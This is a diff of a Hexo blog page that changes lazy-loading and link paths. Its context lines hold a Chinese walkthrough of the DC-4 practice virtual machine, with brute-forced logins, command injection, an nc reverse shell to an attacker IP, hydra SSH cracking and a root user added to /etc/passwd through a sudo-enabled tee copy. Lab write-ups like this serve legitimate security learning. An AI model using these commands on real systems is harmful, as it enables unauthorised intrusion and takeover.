@@ -30,7 +30,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.1"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 
@@ -89,7 +89,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                     
                         <li class="menu-item">
                             <a class=""
-                               href="/cnblogs"
+                               href="/categories/cnblogs/"
                             >
                                 CNBLOGS
                             </a>
@@ -128,7 +128,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/cnblogs">CNBLOGS</a>
+                       href="/categories/cnblogs/">CNBLOGS</a>
                 </li>
             
         </ul>
@@ -204,31 +204,31 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p><a class="link" target="_blank" rel="noopener" href="https://www.five86.com/dc-4.html">下载<i class="fas fa-external-link-alt"></i></a>，安装（vmware直接导入文件），桥接</p>
 <p>kali开始nmap扫描</p>
 <p>nmap -sP 192.168.123.0/24</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200719164434709-620316570.png" alt loading="lazy">
+<img src="1503868-20200719164434709-620316570.png" alt loading="lazy">
 
 <p>找到目标ip：192.168.123.9</p>
 <p>浏览器访问，就一个登陆页面</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200719164509154-76924117.png" width="1000" loading="lazy">
+<img src="1503868-20200719164509154-76924117.png" width="1000" loading="lazy">
 
 <p> </p>
 <p> nmap扫描端口；只有22和80</p>
 <p>可以确定是linux了（废话）</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722101755939-1486713193.png" alt loading="lazy">
+<img src="1503868-20200722101755939-1486713193.png" alt loading="lazy">
 
 <p> 再dirsearch扫描目录</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200719164921773-715340004.png" width="1000" loading="lazy">
+<img src="1503868-20200719164921773-715340004.png" width="1000" loading="lazy">
 
 <p> 也没有有用的信息</p>
 <p>先试试注入，手注和sqlmap都没找出什么来</p>
 <p> </p>
 <p>burp抓包跑字典暴力破解再试试看</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722083839127-1750061235.png" alt loading="lazy">
+<img src="1503868-20200722083839127-1750061235.png" alt loading="lazy">
 
 <p> 暴力破解出了结果</p>
 <p>admin</p>
 <p>happy</p>
 <p>登陆后的页面，</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722083915861-231379410.png" alt loading="lazy">
+<img src="1503868-20200722083915861-231379410.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -236,25 +236,25 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>ls -l    显示目录内容列表</p>
 <p>du -h      显示每个文件和目录的磁盘使用情况</p>
 <p>df -h   显示磁盘相关信息</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722084039243-1322324194.png" alt loading="lazy">
+<img src="1503868-20200722084039243-1322324194.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
 <p> 试试抓包，执行命令作为明文参数，修改成别的，发现也可以执行（这里我是换成了dir）</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722084926019-1762086525.png" width="1000" loading="lazy">
+<img src="1503868-20200722084926019-1762086525.png" width="1000" loading="lazy">
 
 <p> </p>
 <p> </p>
 <p> 验证其可行性后，试试看别的命令，cat command.php</p>
 <p>可以看到执行命令的是这个shell_exec()函数</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722085951661-107414924.png" alt loading="lazy">
+<img src="1503868-20200722085951661-107414924.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
 <p> 用户是www-data，权限组在33</p>
 <p>没有写文件的权限</p>
 <p>直接<a class="link" target="_blank" rel="noopener" href="https://choge.top/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/">反弹shell<i class="fas fa-external-link-alt"></i></a></p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722092238878-1679955723.png" width="1000" loading="lazy">
+<img src="1503868-20200722092238878-1679955723.png" width="1000" loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -263,16 +263,16 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>换nc反弹</p>
 <p>nc 192.168.123.41 1234 -e /bin/bash</p>
 <p>反弹成功</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722095309079-1344845192.png" alt loading="lazy">
+<img src="1503868-20200722095309079-1344845192.png" alt loading="lazy">
 
 <p>查看是否有可用于suid提权的文件</p>
 <p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722101241845-1809258723.png" alt loading="lazy">
+<img src="1503868-20200722101241845-1809258723.png" alt loading="lazy">
 
 <p>没找到</p>
 <p>sudo也用不了</p>
 <p> uname -a和lsb_release -a查看系统版本</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722101110053-1570558000.png" alt loading="lazy">
+<img src="1503868-20200722101110053-1570558000.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -280,7 +280,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p> 有一些关于ssh的漏洞，但是在反弹回来的shell下，我没有权限wget下载文件</p>
 <p> </p>
 <p>看了一些别人的博客，到/home目录下，有三个用户</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722103655965-1633930654.png" alt loading="lazy">
+<img src="1503868-20200722103655965-1633930654.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -288,7 +288,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p> backups里面有一个oldpasswd.bak，是一些密码，估计是要爆破</p>
 <p>mbox打不开，没有权限</p>
 <p>test.sh文件内容像是提示</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722104744291-1768662936.png" alt loading="lazy">
+<img src="1503868-20200722104744291-1768662936.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -296,28 +296,28 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>把oldpasswords.bak中的数据保存下来（jim.txt)</p>
 <p>再使用hydra进行爆破</p>
 <p>　hydra -l jim -P jim.txt 192.168.123.9 ssh<br><br>不到半分钟就出来了</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722105446312-1994701178.png" alt loading="lazy">
+<img src="1503868-20200722105446312-1994701178.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
 <p> 密码：jibril04<br>通过ssh登陆jim</p>
 <p>查看mbox文件内容</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722105625407-610577568.png" alt loading="lazy">
+<img src="1503868-20200722105625407-610577568.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
 <p> 看内容是一封邮件</p>
 <p>从jim这边查找文件，再var/mail下看到一封jim的邮件，打开</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722112546396-1552346468.png" alt loading="lazy">
+<img src="1503868-20200722112546396-1552346468.png" alt loading="lazy">
 
 <p> </p>
 <p> 得到了用户charles的密码^xHhA&amp;hvim0y<br>试着登陆一下</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722112713063-2099022073.png" alt loading="lazy">
+<img src="1503868-20200722112713063-2099022073.png" alt loading="lazy">
 
 <p> </p>
 <p> 成功</p>
 <p>跟着这个思路，回到www-data,查看www-data文件，</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722113021374-1393808338.png" alt loading="lazy">
+<img src="1503868-20200722113021374-1393808338.png" alt loading="lazy">
 
 <p> </p>
 <p> 有很多封邮件，但是都没用</p>
@@ -326,7 +326,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>echo “admin::0:0:::/bin/bash” | sudo teehee -a /etc/passwd</p>
 <p>在passwd下面添加一个没有密码的root用户，</p>
 <p>然后就可以在/root下找到flag了</p>
-<img lazyload src="/images/loading.svg" data-src="DC-4靶机/1503868-20200722225054047-631918545.png" alt loading="lazy">
+<img src="1503868-20200722225054047-631918545.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
@@ -622,8 +622,6 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
     <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
 
 
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/lazyload.js"></script>
 
 
 <div class="post-scripts pjax">
